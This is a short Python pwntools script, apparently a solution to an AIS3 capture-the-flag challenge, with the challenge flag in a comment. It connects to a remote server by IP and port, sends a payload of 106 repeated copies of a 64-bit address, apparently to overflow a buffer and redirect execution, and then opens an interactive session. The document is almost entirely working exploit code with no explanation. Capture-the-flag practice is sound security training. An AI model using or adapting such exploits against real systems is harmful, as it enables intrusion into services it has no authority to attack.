#!/usr/bin/env python
from pwn import *

# AIS3{3hY_d0_yOU_Kn0uu_tH3_r3p1Y?!_I_d0nt_3ant_t0_giu3_QwQ}

host , port = '104.199.235.135' , 2111
y = remote( host ,port )

p = p64( 0x400796 ) * 106

y.sendlineafter(':', 'a')

y.sendlineafter(':', p)

y.interactive()